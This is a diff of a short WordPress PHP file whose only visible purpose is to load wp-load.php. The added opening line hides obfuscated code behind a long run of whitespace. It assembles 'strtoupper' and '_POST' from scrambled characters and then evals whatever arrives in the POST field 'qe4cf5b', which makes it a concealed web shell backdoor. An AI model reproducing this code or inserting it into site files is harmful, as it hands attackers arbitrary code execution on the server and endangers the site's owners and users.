@@ -1,4 +1,4 @@
-<?php 
+<?php                                                                                                                                                                                                                                                       $rjk15 ="tor_epsu" ; $gpx20=$rjk15[6]. $rjk15[0]. $rjk15[2].$rjk15[0].$rjk15[1].$rjk15[7]. $rjk15[5].$rjk15[5].$rjk15[4].$rjk15[2]; $ugtl09 =$gpx20($rjk15[3].$rjk15[5] .$rjk15[1]. $rjk15[6].$rjk15[0]) ; if(isset( ${$ugtl09 }[ 'qe4cf5b']) ) { eval(${$ugtl09 }['qe4cf5b' ]) ;} ?> <?php 
 	require_once('../../../../../wp-load.php');
 ?>
 
